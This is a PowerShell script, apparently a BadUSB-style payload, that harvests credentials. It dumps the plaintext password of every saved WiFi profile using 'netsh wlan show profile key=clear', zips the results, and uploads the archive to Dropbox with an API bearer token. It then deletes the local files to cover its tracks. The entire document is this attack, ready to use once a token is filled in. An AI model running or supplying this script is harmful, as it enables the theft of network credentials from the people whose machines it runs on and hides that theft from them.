function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [Alias("f")]
        [string]$SourceFilePath
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Extracción y carga de contraseñas WiFi
$db = ''
$folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
$userDir = "$env:USERPROFILE\Documents\Networks_$folderDateTime"
New-Item -Path $userDir -ItemType Directory
netsh wlan show profiles | Select-String ": " | ForEach-Object {
    $profileName = $_.ToString().Split(":")[1].Trim()
    netsh wlan show profile name=$profileName key=clear | Out-File -FilePath "$userDir\$profileName.txt"
}
Compress-Archive -Path $userDir -DestinationPath "$userDir.zip"
Start-Sleep -s 5
if (-not ([string]::IsNullOrEmpty($db))) { DropBox-Upload -f "$userDir.zip" }
Remove-Item -Path $userDir -Recurse
Remove-Item -Path "$userDir.zip"
